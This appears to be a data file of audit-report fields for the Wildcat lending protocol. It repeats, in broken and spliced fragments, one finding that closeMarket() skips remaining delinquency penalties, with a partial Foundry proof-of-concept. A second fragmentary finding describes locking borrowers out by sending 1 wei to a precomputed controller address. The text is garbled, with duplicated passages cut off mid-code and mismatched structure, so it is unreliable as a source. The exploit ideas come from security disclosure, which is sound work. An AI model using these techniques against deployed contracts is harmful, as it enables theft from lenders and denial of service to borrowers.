        "gt": "\n# Vulnerability details\n\nTo explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.    MarketState memory state = _getUpdatedState();\n144.    state.annualInterestBips = 0;\n145.    state.isClosed = true;\n146.    state.reserveRatioBips = 0;\n147.    if (_withdrawalData.unpaidBatches.length() > 0) {\n148.      revert CloseMarketWithUnpaidWithdrawals();\n149.    }\n150.    uint256 currentlyHeld = totalAssets();\n151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining \"state.timeDelinquent\" to pay penalty fees. \n152.    if (currentlyHeld < totalDebts) {\n153.      // Transfer remaining debts from borrower\n154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt\n155.    } else if (currentlyHeld > totalDebts) {\n156.      // Transfer excess assets to borrower\n157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);\n158.    }\n159.    _writeState(state);\n160.    emit MarketClosed(block.timestamp);\n161.  }\n```\n\n\n\nWhile closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked the `state.timeDelinquent`.\n\nIf the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.\n\nThe borrower didn't pay the remaining penalties when closing the market, but who will pay it?\n\n* Lenders will keep earning those penalty fees (*the base rate will be 0 after closing, but the penalty fee will still accumulate*)\n    \n* Lenders will start withdrawing their funds.\n    \n* All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.\n    \n* The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.\n    \n\nThe borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.\n\n1. The borrower had a cash flow problem after taking the debt\n    \n2. The market stayed delinquent for a long time\n    \n3. The borrower found some funds\n    \n4. The borrower wanted to close the high-interest debts right after finding some funds\n    \n5. Immediately paid everything and closed the market while the market was still delinquent.\n    \n6. From the borrower's perspective, they paid all of their debt while closing the market.\n\n7. But in reality, the borrower only paid the half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

        "gtraw": "\n# Vulnerability details\n\nTo explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

        "gt": "\n# Vulnerability details\n\nTo explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.    MarketState memory state = _getUpdatedState();\n144.    state.annualInterestBips = 0;\n145.    state.isClosed = true;\n146.    state.reserveRatioBips = 0;\n147.    if (_withdrawalData.unpaidBatches.length() > 0) {\n148.      revert CloseMarketWithUnpaidWithdrawals();\n149.    }\n150.    uint256 currentlyHeld = totalAssets();\n151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining \"state.timeDelinquent\" to pay penalty fees. \n152.    if (currentlyHeld < totalDebts) {\n153.      // Transfer remaining debts from borrower\n154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt\n155.    } else if (currentlyHeld > totalDebts) {\n156.      // Transfer excess assets to borrower\n157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);\n158.    }\n159.    _writeState(state);\n160.    emit MarketClosed(block.timestamp);\n161.  }\n```\n\n\n\nWhile closing the market, the total debt is calculated and the required amount is transferred to the market.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

        ],
        "gtraw": "\n# Vulnerability details\n\nTo explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.    MarketState memory state = _getUpdatedState();\n144.    state.annualInterestBips = 0;\n145.    state.isClosed = true;\n146.    state.reserveRatioBips = 0;\n147.    if (_withdrawalData.unpaidBatches.length() > 0) {\n148.      revert CloseMarketWithUnpaidWithdrawals();\n149.    }\n150.    uint256 currentlyHeld = totalAssets();\n151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining \"state.timeDelinquent\" to pay penalty fees. \n152.    if (currentlyHeld < totalDebts) {\n153.      // Transfer remaining debts from borrower\n154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt\n155.    } else if (currentlyHeld > totalDebts) {\n156.      // Transfer excess assets to borrower\n157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);\n158.    }\n159.    _writeState(state);\n160.    emit MarketClosed(block.timestamp);\n161.  }\n```\n\n\n\nWhile closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked the `state.timeDelinquent`.\n\nIf the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.\n\nThe borrower didn't pay the remaining penalties when closing the market, but who will pay it?\n\n* Lenders will keep earning those penalty fees (*the base rate will be 0 after closing, but the penalty fee will still accumulate*)\n    \n* Lenders will start withdrawing their funds.\n    \n* All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.\n    \n* The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.\n    \n\nThe borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.\n\n1. The borrower had a cash flow problem after taking the debt\n    \n2. The market stayed delinquent for a long time\n    \n3. The borrower found some funds\n    \n4. The borrower wanted to close the high-interest debts right after finding some funds\n    \n5. Immediately paid everything and closed the market while the market was still delinquent.\n    \n6. From the borrower's perspective, they paid all of their debt while closing the market.\n\n7. But in reality, the borrower only paid the half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

    {
        "gt": "\n# Vulnerability details\n\nTo explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.    MarketState memory state = _getUpdatedState();\n144.    state.annualInterestBips = 0;\n145.    state.isClosed = true;\n146.    state.reserveRatioBips = 0;\n147.    if (_withdrawalData.unpaidBatches.length() > 0) {\n148.      revert CloseMarketWithUnpaidWithdrawals();\n149.    }\n150.    uint256 currentlyHeld = totalAssets();\n151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining \"state.timeDelinquent\" to pay penalty fees. \n152.    if (currentlyHeld < totalDebts) {\n153.      // Transfer remaining debts from borrower\n154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt\n155.    } else if (currentlyHeld > totalDebts) {\n156.      // Transfer excess assets to borrower\n157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);\n158.    }\n159.    _writeState(state);\n160.    emit MarketClosed(block.timestamp);\n161.  }\n```\n\n\n\nWhile closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked the `state.timeDelinquent`.\n\nIf the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.\n\nThe borrower didn't pay the remaining penalties when closing the market, but who will pay it?\n\n* Lenders will keep earning those penalty fees (*the base rate will be 0 after closing, but the penalty fee will still accumulate*)\n    \n* Lenders will start withdrawing their funds.\n    \n* All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.\n    \n* The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.\n    \n\nThe borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.\n\n1. The borrower had a cash flow problem after taking the debt\n    \n2. The market stayed delinquent for a long time\n    \n3. The borrower found some funds\n    \n4. The borrower wanted to close the high-interest debts right after finding some funds\n    \n5. Immediately paid everything and closed the market while the market was still delinquent.\n    \n6. From the borrower's perspective, they paid all of their debt while closing the market.\n\n7. But in reality, the borrower only paid the half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

        ],
        "gtraw": "\n# Vulnerability details\n\nTo explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.    MarketState memory state = _getUpdatedState();\n144.    state.annualInterestBips = 0;\n145.    state.isClosed = true;\n146.    state.reserveRatioBips = 0;\n147.    if (_withdrawalData.unpaidBatches.length() > 0) {\n148.      revert CloseMarketWithUnpaidWithdrawals();\n149.    }\n150.    uint256 currentlyHeld = totalAssets();\n151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining \"state.timeDelinquent\" to pay penalty fees. \n152.    if (currentlyHeld < totalDebts) {\n153.      // Transfer remaining debts from borrower\n154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt\n155.    } else if (currentlyHeld > totalDebts) {\n156.      // Transfer excess assets to borrower\n157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);\n158.    }\n159.    _writeState(state);\n160.    emit MarketClosed(block.timestamp);\n161.  }\n```\n\n\n\nWhile closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked the `state.timeDelinquent`.\n\nIf the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.\n\nThe borrower didn't pay the remaining penalties when closing the market, but who will pay it?\n\n* Lenders will keep earning those penalty fees (*the base rate will be 0 after closing, but the penalty fee will still accumulate*)\n    \n* Lenders will start withdrawing their funds.\n    \n* All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.\n    \n* The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.\n    \n\nThe borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.\n\n1. The borrower had a cash flow problem after taking the debt\n    \n2. The market stayed delinquent for a long time\n    \n3. The borrower found some funds\n    \n4. The borrower wanted to close the high-interest debts right after finding some funds\n    \n5. Immediately paid everything and closed the market while the market was still delinquent.\n    \n6. From the borrower's perspective, they paid all of their debt while closing the market.\n\n7. But in reality, the borrower only paid the half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

